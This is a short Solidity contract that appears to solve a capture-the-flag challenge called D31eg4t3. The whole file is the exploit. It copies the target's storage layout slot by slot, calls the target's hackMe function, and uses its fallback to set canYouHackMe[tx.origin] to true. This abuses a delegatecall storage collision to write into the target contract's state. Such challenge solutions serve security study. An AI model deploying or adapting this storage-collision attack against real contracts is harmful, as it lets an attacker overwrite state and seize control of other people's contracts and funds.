// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./D31eg4t3.sol";

contract D31eg4t3QuillAttack {
    uint a = 12345;   // 0
    uint8 b = 32;     // 0
    string private d; // 1
    uint32 private c; // 2
    string private mot;   // 3
    address public owner;  // 4
    mapping (address => bool) public canYouHackMe; // 5
    D31eg4t3Quill public targetContract;

    function attack(address target) public {
        targetContract = D31eg4t3Quill(target);
        targetContract.hackMe("");
    }
    
    fallback() external {
        canYouHackMe[tx.origin] = true;
    }
}